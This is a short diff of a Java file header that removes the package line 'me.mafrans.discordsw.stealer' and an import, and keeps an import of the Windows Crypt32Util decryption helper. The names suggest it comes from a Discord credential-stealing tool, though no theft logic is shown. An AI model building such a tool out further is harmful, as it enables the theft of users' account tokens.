@@ -1,7 +1,4 @@
-package me.mafrans.discordsw.stealer;
-
 import com.sun.jna.platform.win32.Crypt32Util;
-import me.mafrans.discordsw.Main;
 
 import java.io.File;
 import java.io.IOException;
